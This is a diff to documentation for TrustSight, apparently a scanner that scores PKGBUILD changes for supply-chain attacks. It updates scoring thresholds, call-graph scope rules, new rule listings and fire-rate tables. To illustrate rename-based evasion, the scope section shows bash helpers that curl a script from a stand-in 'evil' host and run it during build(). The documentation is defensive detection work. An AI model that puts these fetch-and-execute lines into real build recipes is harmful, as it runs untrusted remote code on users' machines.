@@ -35,7 +35,7 @@ Each severity level carries a weight that reflects its information value: how of
 | LOW | 5 | High | Weak signal. Demoted from higher severity if corpus fire rate exceeds 30%. |
 | INFO | 0 | Variable | Recorded for audit trail only. No score contribution. |
 
-A CRITICAL rule on its own (weight 40) pushes a package into the FLAGGED range (21+). A single HIGH rule (weight 25) does the same. Two MEDIUM rules (15 + 15 = 30) also reach FLAGGED. The 20-point UNFLAGGED threshold means any single CRITICAL or HIGH rule, or any combination of lower-severity rules summing above 20, will flag the package.
+A CRITICAL rule on its own (weight 40) puts a package into the review queue under the default profile, whose threshold is 20. A single HIGH rule (weight 25) does the same, and so do two MEDIUM rules (15 + 15 = 30). The threshold is a *workload* choice rather than a property of the score: [`[review] profile`](../configuration.md#review) moves it to 40 (`quiet`) or 10 (`strict`) without changing any weight, band or arithmetic, and the report carries the profile and its effective threshold beside the `flagged` decision so a reader can see which queue produced it.
 
 ### How match_target selects what the rule sees
 
@@ -65,6 +65,17 @@ The `message` context applies only when a line is *nothing but* a message. A she
 
 A scope entry may also name the enclosing function rather than a generic context. This distinguishes cases that `function_body` alone cannot: `curl` inside `build()` is routine, while `curl` inside `pkgver()` reaches the network during version resolution, before any review step. R051 uses `scope = ["pkgver"]` for exactly this.
 
+A named scope asks whether the code *runs* during that function, not whether it is written inside one, and those are different questions because the reviewed party chooses the function names:
+
+```bash
+_fetch() { curl -fsSL https://evil.example/x.sh -o "$srcdir/x.sh"; }
+build()  { _fetch; bash "$srcdir/x.sh"; }
+```
+
+`_fetch` is not `build`, so keying on the enclosing name let a rename work as an evasion. Scope therefore follows the call graph: a line resolves to every function whose execution reaches it, transitively and through `$(...)`. The graph is built over the whole current PKGBUILD where the analysis has it, not only the diff hunk, so a helper added by one diff still connects to the `build()` that calls it from unchanged lines. `ScopeResolver` in `src/trustsight/rules.py` is the single implementation, shared by the config-driven `scope` field and by the rules in `analysis/build.py` and `analysis/delivery.py` that ask the same question in Python.
+
+A finding names the indirection rather than claiming the wrong location: `_fetch(), called from build() downloads ...`, so the reader is sent to the line that holds the code.
+
 Note that a *bare* function header (`build() {`) is classified as `other`, not `function_body`: the context applies to the lines *inside* the braces. A header that also carries code, though, is `function_body`, because that code really does run there: `build() { curl evil | bash; }` is matched by `function_body`-scoped rules, and the context does not leak to the lines that follow.
 
 A pattern that matches the header while scoping itself to `function_body` therefore misses the ordinary multi-line form and only fires on single-line definitions; `trustsight lint-rules` reports this as `scope-contradiction`.
@@ -73,7 +84,7 @@ A pattern that matches the header while scoping itself to `function_body` theref
 
 | Tier | Rule sources | What they measure |
 |------|-------------|-------------------|
-| A (Structural) | R-series (through R143), S001-S008, X001-X007, C001-C007, D001-D004 | Direct pattern matching against PKGBUILD commands and structure |
+| A (Structural) | R-series (through R151), S001-S008, X001-X023, C001-C009, D001-D004 | Direct pattern matching against PKGBUILD commands and structure |
 | B (Priors/Context) | Source bucket classification | Domain reputation of new URLs (not a rule, but a scoring input) |
 | C (History/Novelty) | URL and maintainer novelty | First-seen signals from the local database |
 | D (Verification) | Checksum, PGP, GPG presence | Declared integrity metadata, reported at weight 0 |
@@ -81,12 +92,12 @@ A pattern that matches the header while scoping itself to `function_body` theref
 Rules only contribute to Tier A. Tiers B and C are computed independently and added to the score alongside the rule contributions.
 
 Tier D contributes nothing to the score. Declared verification is emitted as
-weight-0 `P001`-`P007` findings and reported to the reader: TrustSight never
+weight-0 `P001`-`P008` findings and reported to the reader: TrustSight never
 fetches, so it cannot confirm that a declared key signs anything, and a signal
 an attacker can assert for free must not be able to lower a score. See
 [B10](../../security.md#b10-positive-evidence-is-reported-never-credited).
 
-### Declared-practice findings (P001-P007) {#declared-practice}
+### Declared-practice findings (P001-P008) {#declared-practice}
 
 The P namespace reports practices the recipe *declares*, not risks that were
 found. The `P` prefix exists so a reader seeing `P0xx` in the output knows at
@@ -102,10 +113,20 @@ rendered from `DECLARED_REASONS`.
 | `P005` | Source pinned to a full commit hash (`checksum_pinned`) |
 | `P006` | Source pinned to a tag - the weaker pin, which `R079` exists to flag because a tag can be repointed |
 | `P007` | Source hosted on a trusted forge over HTTPS (`trusted_forge` bucket) |
+| `P008` | Source tracks a branch or unpinned ref, so upstream decides at build time what this compiles and runs |
 
-`P004` is skipped. Only `P002`, `P003` and `P005` render unprompted by default:
-five of the seven on every package would bury the risk findings, and the
-default set is the ones a reader would find *surprising by their absence*. The
+`P004` is skipped. Only `P002`, `P003`, `P005` and `P008` render unprompted by
+default: six of the eight on every package would bury the risk findings, and
+the default set is the ones a reader would find *surprising by their absence* -
+plus `P008`, which is the one whose *presence* is the notable thing.
+
+`P008` is the counterpart `P005`/`P006` never had. A recipe that pins says so;
+one that tracks a branch produced no line at all, and "nothing" reads exactly
+like "pinned" to anyone scanning the group. It is deliberately not a coverage
+gap: the statement is true of every VCS package by design, and raising a gap
+would put 20.1% of the locked benign corpus (653 of 3,246 diffs) into
+Inconclusive, which buys alert fatigue rather than information. The band is
+left alone and the reader is told what the recipe declares. The
 rest render under `--verbose`. The P namespace contrasts with R079/R096/R110:
 those fire when a practice is *changed*, these report when one is *present*.
 No P finding can lower a score - B10.
@@ -297,6 +318,14 @@ See [C003: Source URL Changed Without Version Bump](integrity.md#c003).
 See [C004: Checksum Removed For Unchanged Source](integrity.md#c004).
 
 
+### C008 {#c008}
+
+See [C008: Unread Content Moved Under A Stable Version](integrity.md#c008).
+
+### C009 {#c009}
+
+See [C009: Unread Content Moved With The Version](integrity.md#c009).
+
 ### C005 {#c005}
 
 See [C005: Binary Artifact From Untrusted Source](integrity.md#c005).
@@ -450,7 +479,7 @@ See [R061: Hidden Network Fetch In Build](fetch-and-execution.md#r061).
 
 ## Measured fire rates {#experimental-fire-rates}
 
-The detailed rows below are historical measurements against the 3,246-diff benign corpus with a 209,909-name dependency corpus. The current aggregate calibration baseline is 3,739 diffs; the rows are retained with their source corpus because the per-rule hit counts have not been regenerated as a complete table. All D-series, R061-R064, and R081-R082 rules are **on by default**, as are the code-emitted rules R083-R131. These are **false-positive rates**: every hit is a benign package.
+The detailed rows below are historical measurements against the 3,246-diff benign corpus with a 209,909-name dependency corpus, retained because the per-rule hit counts have not been regenerated as a complete table. All D-series, R061-R064, and R081-R082 rules are **on by default**, as are the code-emitted rules R083-R131. These are **false-positive rates**: every hit is a benign package.
 
 The numbers are enforced, not just recorded. `scripts/calibration_gates.py` replays the corpus against the *shipped* configuration in a temporary directory with a cold database, and fails the build if any scoring rule exceeds a 0.30 fire rate, if benign p95 reaches the malicious p5, if a weight-0 annotation starts scoring, or if a labelled attack fixture stops being detected. It runs on every push. Class C and Class D rules are absent from this table because they cannot fire on a stateless diff at all, which is itself one of the gates.
 
@@ -459,7 +488,7 @@ For a complete reference including the core and expanded rules, see [Fire Rates]
 | Rule | Severity | Fires | Rate | Read |
 |------|----------|-------|------|------|
 | D004 | HIGH | 0 | 0.00 % | No false positive across the 2084 corpus diffs that declare `provides`/`replaces`. |
-| R062 | HIGH | 3 | 0.09 % | All `mullvad-vpn-bin`, which sets a setuid bit and enables a unit from `post_install()`. Real privileged behaviour, which is the point. |
+| R062 | HIGH | 4 | 0.12 % | Three are `mullvad-vpn-bin`, which sets a setuid bit and enables a unit from `post_install()`. The fourth is `claude-desktop-bin`, whose `_fix_sandbox()` helper - reached only by following the call graph - sets 4755 on the Electron sandbox binary. Real privileged behaviour in both, which is the point. |
 | R063 | HIGH | 0 | 0.00 % | Zero, because it asks where the patch comes from rather than whether it is declared. The broad "not in `source=()`" form measured 2.13 %. |
 | R064 | MEDIUM | 1 | 0.03 % | `transset-df`, a genuine https to http downgrade. |
 | R065 | INFO | - | - | Not calibrated: fires on any recent update, which is inherently time-of-run dependent. |
@@ -620,7 +649,7 @@ See [R075: Dependency-Set Expansion](count-based.md#r075-rule).
 
 Defined in `src/trustsight/analysis/build.py`. They inspect install hooks and
 build-function content for additional risk signals. Both graduated from experimental
-to enabled by default in v0.11.0 with zero false positives on the 3243-diff benign corpus.
+to enabled by default in v0.11.0 with zero false positives on the benign corpus of that release.
 
 ### R081 {#r081}
 
@@ -997,7 +1026,7 @@ See [R126: Adopt-then-Modify](maintainer-and-metadata.md#r126).
 ## Additional Per-Package Rules {#additional-per-package-rules}
 
 R141-R143 are per-package findings, not Class D corpus findings. S001-S008
-and X001-X007 are the sabotage and crossfire families; their category pages
+and X001-X023 are the sabotage and crossfire families; their category pages
 are authoritative for their conditions and severities.
 
 ### R141 {#r141}
@@ -1007,6 +1036,78 @@ See [R141: Adopted From Orphan](maintainer-and-metadata.md#r141).
 ### R142 {#r142}
 
 See [R142: Recipe Changed Without Upstream](integrity.md#r142).
+
+### W002 {#w002}
+
+See [W002: Build Resolves Dependencies From A Registry](unverifiable.md#w002).
+
+### W003 {#w003}
+
+See [W003: Applies A Patch This Analysis Did Not Read](unverifiable.md#w003).
+
+### W006 {#w006}
+
+See [W006: Generated File Names A Build-Only Path](unverifiable.md#w006).
+
+### W005 {#w005}
+
+See [W005: Build Runs A Target Whose Recipe Was Not Read](unverifiable.md#w005).
+
+### W004 {#w004}
+
+See [W004: Build Engine Runs A Manifest This Analysis Did Not Read](unverifiable.md#w004).
+
+### X022 {#x022}
+
+See [X022: Generated Config Handed To The Tool That Reads It](crossfire.md#x022).
+
+### X023 {#x023}
+
+See [X023: Command Output Executed As A Script](crossfire.md#x023).
+
+### X021 {#x021}
+
+See [X021: Executor Runs A File Chosen At Runtime](crossfire.md#x021).
+
+### X020 {#x020}
+
+See [X020: Recipe Writes The Build Steps The Engine Runs](crossfire.md#x020).
+
+### W001 {#w001}
+
+See [W001: Executes Code This Analysis Did Not Read](unverifiable.md#w001).
+
+### R151 {#r151}
+
+See [R151: Boot Or Image Artifact Built From The Source Tree](install-and-persist.md#r151).
+
+### R150 {#r150}
+
+See [R150: Unread Script Executed During Packaging](fetch-and-execution.md#r150).
+
+### R149 {#r149}
+
+See [R149: Committed Config Points At A Build-Only Path](install-and-persist.md#r149).
+
+### R148 {#r148}
+
+See [R148: Metadata Names A Source The Recipe Does Not](integrity.md#r148).
+
+### R147 {#r147}
+
+See [R147: Checksum Array Shorter Than Source Array](integrity.md#r147).
+
+### R146 {#r146}
+
+See [R146: Committed Companion Carries A Fetch-Execute Payload](fetch-and-execution.md#r146).
+
+### R145 {#r145}
+
+See [R145: Packaged File Names A Build-Only Path](install-and-persist.md#r145).
+
+### R144 {#r144}
+
+See [R144: Packaged File Points At A World-Writable Path](install-and-persist.md#r144).
 
 ### R143 {#r143}
 
@@ -1039,6 +1140,54 @@ See [X006: Source Points Somewhere Unexpected](crossfire.md#x006).
 ### X007 {#x007}
 
 See [X007: Multiple Evasion Techniques](crossfire.md#x007).
+
+### X008 {#x008}
+
+See [X008: Whitespace A Shell Does Not Split On](crossfire.md#x008).
+
+### X009 {#x009}
+
+See [X009: Fetch Through An Uncatalogued Client](crossfire.md#x009).
+
+### X010 {#x010}
+
+See [X010: Interpreter One-Liner Reaches The Network](crossfire.md#x010).
+
+### X011 {#x011}
+
+See [X011: Package Manager Runs Fetched Code At Build Time](crossfire.md#x011).
+
+### X012 {#x012}
+
+See [X012: Build Toolchain Redirected Into The Source Tree](crossfire.md#x012).
+
+### X013 {#x013}
+
+See [X013: Fetch Redirected Or Trust Root Replaced](crossfire.md#x013).
+
+### X014 {#x014}
+
+See [X014: Environment Variable Names Code To Run](crossfire.md#x014).
+
+### X015 {#x015}
+
+See [X015: Work Scheduled To Run After The Build](crossfire.md#x015).
+
+### X016 {#x016}
+
+See [X016: Fetch Piped Into An Unrecognised Consumer](crossfire.md#x016).
+
+### X017 {#x017}
+
+See [X017: Tool Flag Or Builtin Carries A Command](crossfire.md#x017).
+
+### X018 {#x018}
+
+See [X018: Interpreter One-Liner Assembles A Name](crossfire.md#x018).
+
+### X019 {#x019}
+
+See [X019: Host Material Sent Or Packaged](crossfire.md#x019).
 
 ### S001 {#s001}
 
@@ -1109,13 +1258,13 @@ Measured against the TrustSight test corpus.
 
 !!! warning "Two rows predate a ruleset expansion"
 
-    The recall rows above were measured while `observation_count` was never populated, so Tier C novelty contributed zero to every score (see [Cold Start and Maturity](../../explanation/cold-start-and-maturity.md)), and before the R039+ expanded rules or C004-C007 shipped. The three distribution rows below are re-measured by the calibration gates against the current 3,739-diff corpus on every push.
+    The recall rows above were measured while `observation_count` was never populated, so Tier C novelty contributed zero to every score (see [Cold Start and Maturity](../../explanation/cold-start-and-maturity.md)), and before the R039+ expanded rules or C004-C007 shipped. The three distribution rows below are re-measured by the calibration gates against the current 3,246-diff corpus on every push.
 
 | Rule | Recall | Notes |
 |------|--------|-------|
 | CRITICAL class (all) | 100 % | Every CRITICAL-class sample detected. |
 | R012 (prompt injection) | 17 % | Tripwire; catches obvious patterns only. Low recall is intentional. |
 | R013 (unicode bidi) | 88 % | Misses some bidi variants. |
-| Benign zero-rate | 68.3 % | Percentage of benign diffs scoring 0. |
+| Benign zero-rate | 68.4 % | Percentage of benign diffs scoring 0. |
 | Benign p95 | 35 | 95th percentile score on benign corpus. |
 | CRITICAL p5 | 60 | 5th percentile score on CRITICAL-class corpus. |
